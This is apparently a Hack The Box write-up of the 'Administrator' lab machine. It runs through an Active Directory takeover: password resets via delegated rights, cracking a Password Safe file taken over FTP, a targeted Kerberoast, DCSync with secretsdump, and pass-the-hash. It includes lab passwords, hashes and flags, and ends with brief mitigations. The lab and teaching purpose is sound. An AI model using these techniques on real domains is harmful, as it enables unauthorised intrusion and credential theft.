# 👤 HTB - Administrator

- **System:** Windows Server 2022
- **IP Address:** 10.10.11.42
- **Difficulty:** Medium
- **Domain:** administrator.htb
- **Initial Credentials Provided:**
    - Username: `Olivia`
    - Password: `ichliebedich`
---
# 1. 🔎 Reconnaissance

## Nmap
```bash
❯ sudo nmap -sCV -p21,53,88,123,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49665,49666,49667,49668 -Pn -n 10.10.11.42
	PORT      STATE  SERVICE       VERSION
	21/tcp    open   ftp           Microsoft ftpd
	| ftp-syst: 
	|_  SYST: Windows_NT
	53/tcp    open   domain        Simple DNS Plus
	88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-27 14:49:42Z)
	123/tcp   closed ntp
	135/tcp   open   msrpc         Microsoft Windows RPC
	139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
	445/tcp   open   microsoft-ds?
	464/tcp   open   kpasswd5?
	593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp   open   tcpwrapped
	3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
	3269/tcp  open   tcpwrapped
	5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open   mc-nmf        .NET Message Framing
	47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open   msrpc         Microsoft Windows RPC
	49665/tcp open   msrpc         Microsoft Windows RPC
	49666/tcp open   msrpc         Microsoft Windows RPC
	49667/tcp open   msrpc         Microsoft Windows RPC
	49668/tcp open   msrpc         Microsoft Windows RPC
```
- Key services:
    - LDAP (389, 3268)
    - Kerberos (88)
    - SMB (445)
    - WinRM (5985)
    - FTP (21)
## NetExec SMB
```bash
❯ netexec smb 10.10.11.42
	SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
```
- Windows Server 2022
- SMB Signing: True
---
# 2. 🛠️ Enumeration
## WinRM Access with Credentials
```bash
❯ netexec winrm  10.10.11.42 -u'Olivia' -p 'ichliebedich'
	WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
	WINRM       10.10.11.42     5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```
Successful login as `Olivia`.
### Enumerate Users
```bash
❯ netexec smb  10.10.11.42 -u'Olivia' -p 'ichliebedich'  --users
	SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
	SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
	SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
	SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
	SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
	SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
	SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
	SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0        
	SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0        
	SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
	SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
	SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0        
	SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0        
	```
Users found:
- Administrator
- Guest
- krbtgt
- olivia
- michael
- benjamin
- emily
- ethan
- alexander
- emma
    
## BloodHound Enumeration
Using BloodHound we discover:
- `Olivia` has **GenericAll** rights over `michael`.
- The GenericAll permission grants OLIVIA@ADMINISTRATOR.HTB the ability to change the password of the user MICHAEL@ADMINISTRATOR.HTB without knowing their current password. 
- This is equivalent to the "ForceChangePassword" edge in BloodHound.
![[Pasted image 20250427100442.png|700]]
---
# 3. 🚀 Initial Exploitation

## Change Michael's Password
```powershell
❯ evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
*Evil-WinRM* PS C:\Users\olivia\Desktop> net user michael pass123 /DOMAIN
	The command completed successfully.
```

## Access as Michael
- We didn't find anything interesting, not even the user flag.
```bash
❯ evil-winrm -i 10.10.11.42 -u 'michael' -p 'pass123'
	*Evil-WinRM* PS C:\Users\michael\Documents> cd ..
	*Evil-WinRM* PS C:\Users\michael> tree
	Folder PATH listing
	Volume serial number is 6131-DE70
	C:.
	+---Desktop
	+---Documents
	+---Downloads
	+---Favorites
	+---Links
	+---Music
	+---Pictures
	+---Saved Games
	+---Videos
```

## BloodHound Enumeration
- `Michael` has **ForceChangePassword** rights over `Benjamin`.
- The user MICHAEL@ADMINISTRATOR.HTB has the capability to change the user BENJAMIN@ADMINISTRATOR.HTB's password without knowing that user's current password.
<img src="Pasted image 20250427100753.png" alt="BloodHound path" width="700"/>
### Change Benjamin's Password using RPC
From Michael using RPC:
```bash
net rpc password benjamin pass123 -U administrator.htb/michael%pass123 -S administrator.htb
```
---
# 4. 🔐 Horizontal Privilege Escalation

## FTP Access as Benjamin
- Download `Backup.psafe3`
```bash
❯ ftp 10.10.11.42
	Connected to 10.10.11.42.
	220 Microsoft FTP Service
	Name (10.10.11.42:maik): benjamin
	331 Password required
	Password: pass123
	230 User logged in.
	Remote system type is Windows_NT.
	ftp> dir
		229 Entering Extended Passive Mode (|||54035|)
		125 Data connection already open; Transfer starting.
		10-05-24  08:13AM                  952 Backup.psafe3
		226 Transfer complete.
	ftp> get Backup.psafe3
		local: Backup.psafe3 remote: Backup.psafe3
		229 Entering Extended Passive Mode (|||54036|)
		125 Data connection already open; Transfer starting.
		100% |******************|   952       18.90 KiB/s    00:00 ETA
		226 Transfer complete.
		WARNING! 3 bare linefeeds received in ASCII mode.
		File may not have transferred correctly.
		952 bytes received in 00:00 (18.78 KiB/s)
```

## Cracking the Password Safe Database
- Cracking the password using hashcat
```bash
❯ hashcat -m 5200 -a 0 -O Backup.psafe3 /usr/share/wordlists/rockyou.txt
	Dictionary cache hit:
	* Filename..: /usr/share/wordlists/rockyou.txt
	* Passwords.: 14344385
	* Bytes.....: 139921507
	* Keyspace..: 14344385
	Backup.psafe3:tekieromucho  
```
Password found: `tekieromucho`
### Passwords found in the Backup.psafe3 database
We opened the `Backup.psafe3` file using [Password Safe](https://pwsafe.org/) and unlocked the database with the previously cracked password `tekieromucho`.
**Extracted users and passwords:**
- Emily -> `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- Emma -> `WwANQWnmJnGV07WQN8bMS7FMAbjNur`
- Alexander -> `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
### Access as Emily
- Read flag `user.txt`
```bash
❯ netexec winrm  10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM    10.10.11.42    5985   DC   [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM    10.10.11.42    5985   DC   [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)

evil-winrm -i 10.10.11.42
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
c*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir

    Directory: C:\Users\emily\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         12/3/2024   6:38 AM             34 user.txt

*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
	6d09986c118d6549dea14bded8c4e5b6

```
---
# 5. 🛡️ Privilege Escalation
## Permission Enumeration
- `Emily` has **GenericWrite** over `Ethan`.
- The user EMILY@ADMINISTRATOR.HTB has generic write access to the user ETHAN@ADMINISTRATOR.HTB.
- Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

<img src="Pasted image 20250427101749.png" alt="BloodHound path" width="700"/>

## Exploit GenericWrite Using `targetedKerberoast.py`
- The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash.
- The recovered hash can be cracked offline
```bash
❯  git clone https://github.com/ShutdownRepo/targetedKerberoast
	Cloning into 'targetedKerberoast'...
	remote: Enumerating objects: 65, done.
	remote: Counting objects: 100% (22/22), done.
	remote: Compressing objects: 100% (10/10), done.
	remote: Total 65 (delta 14), reused 12 (delta 12), pack-reused 43 (from 1)
	Unpacking objects: 100% (65/65), 238.06 KiB | 1.18 MiB/s, done.
❯  cd targetedKerberoast
❯  sudo apt install rdate
❯ rdate -n 10.10.11.42

❯ python3  targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$743b221342ca6fb4628f6c6510be7b39$7dcda6e6a060593c7d7606fa8b3364f1608c5e361e078e31660f0aa2caa56e051d99d60ee4fd9c64ec31c9e088860e424e76f42f8e3601be46c5bcabb593a1a6acd9c80e59c26566c6b33ef90539412e2c45a5e179eba1956f424dd80a9d1b68ba57ca2fc0d4e03b0097bcc7a918c162b6c399a9a9ccdd8b2927ccb64d994efa42b3ee2a114206357f329526c7a0adb2ebe43705f82987bb67eb33bf56df8dbdb4a472b0b42268459a4794b9cc05bcd2593df588dc1884301d736a5ea7077649c040c6e98f62033fdc5d3cf432fcc44bbdc4e50aef811ba47f36c5538da674aa7d284eb5ec726e412b3100f6006ee279b9cad24f579dc71683b851f1a525a55b16349049131b3d473c8fb5330b4b34c3bf3a1d2f96cf9590de7f31d6fe046ac5f446cd357300af744d612672e41812a54ae0b335fb80b3038a49fce450ebc3346e3684fc05e40db5cc248f0439dfcfed42ed4acf2d4b696c07d6694ba24b81704d111a039e94cb52b2631b989e9901c3562949c8546a64d21485bfb14bcbf00e1920f4d4b923632b28e1fd2193cec3db76ff27d51410ed2372810d24151cab89c93d590d2312e76a868ce7fe8c7df5301519520fff17c9519be2f239601067b1782e62448984e916ba568af8240a2a2218699037f9b80bff1281d985d4a94439bc2681a89b6f6f2aa7cde47a69f409c58bc0e9c57c08b4aec0efc077339f4e9d80531c77547534f6df8ef31add511daf62b38728d9550186045a32b32408f185a3c51d1b9b7734b1071fc01c6d70a9c45c2187a5de425469f0cafe4b4afeb76e23a160a26a8f44b562636f7f5f6e8e7d82ff1ee3ebd4855f13e25a31e53fcd0c80ec3531e05b7841d8538f0703b7e5fbe273308c2076c79697e2c8a986d56875c7fd5da68136c103abcce958faba1de1194f97eb7987cadc1650709a4e6614b73c9729547dc0931af2c187ee95db72012f948ca888f3f3ae4080ebdad4cb9b3f1059544ed918fad28914c5836c37ad9ce6a05572026fd9a1412306356cf0864ac49cf3a4137959a923f6f35e0c1907fc8bf89046558025602f88f966e379bd8a41925e923ded9309065cdba1c8a245b8827f6b86d2793d800cf7ad6f631c5c7891e6617df3b4f91a30d218e10d961fdce47000cfe03d90aaac2bb5e4ac8f25eee3c4060c40f0441fd2342edc427b59835a828ad510c05df1f99e811308bbab38b96eabcb16b74a1faa0303e6dc21f5a364200401466a41f9cff69bd24ac44478b657d215494ae2b2733086e67fc05f1f72938fefe5c2911ca69f61a5d5b7d4827bfb6f0c741d4b7123c9fb13769dd3641a31826f76ef7ad90b64ac29e62927458d5df2e58ea7d27f870454ba0ace9e80abf60f4a44602b54bd7afec5dd8f7d8021a948837f01892fc1824220d87762e9ff350f3bfcb5fdbdb2d0f208f3bb2ef409a2997956334ab6458c55dc99e1fafa81af3b35c1bab6ea71e8f963c140d26001e0de75da0ad0865d8605a1910e30d89cb1cf9aa13b3909fe25ad9b3ec9ab
```
Retrieve a TGS hash for Ethan.
### Cracking Ethan's TGS Kerberos Hash
```bash
❯ hashcat -m 13100 hash_kerberos_ethan /usr/share/wordlists/rockyou.txt
	$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$743b221342ca6fb4628f6c651...13b3909fe25ad9b3ec9ab:limpbizkit
```
Password found: `limpbizkit`

## DCSync Attack
While analyzing BloodHound data, we observed that the user `ethan@administrator.htb` had the following privileges over the `administrator` account:
- `GetChanges`
- `GetChangesAll`
- `GetChangesInFilteredSet`
<img src="Pasted image 20250427102807.png" alt="BloodHound path" width="700"/>
These three rights together allow `ethan` to perform a **DCSync attack** — effectively requesting replication of password hashes from the Domain Controller.
Using `secretsdump.py`, we were able to extract the NTLM hash for the `Administrator` account and gain full domain compromise.
```bash
 ❯ secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
	Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
	
	[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
	administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
	administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
	administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
```
Retrieve the NTLM hash for Administrator:
- Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e`
    
### Administrator Access
- Read flag `root.txt`.
```bash
❯ evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'                               
	*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
	*Evil-WinRM* PS C:\Users\Administrator> type Desktop/root.txt
		d539ee407523ded7604653c14636225b
```
---
# 📝 Summary

The "Administrator" box required exploiting delegated permissions inside an Active Directory environment:
- Use of provided initial credentials
- Password resets leveraging **GenericAll** rights
- Cracking a password database retrieved via FTP
- Exploiting **GenericWrite** to Kerberoast
- Performing a **DCSync** attack to dump Administrator credentials

A great exercise in lateral movement, privilege escalation, and Active Directory attacks.
# 🔒 Mitigations

To prevent similar attacks:
- Limit delegation and replication permissions.
- Audit ACLs regularly using BloodHound.
- Harden service accounts and apply strong password policies.
- Monitor for DCSync activity and replication API usage.
- Disable unnecessary services like FTP.
- Ensure correct time synchronization to avoid Kerberos ticket issues.
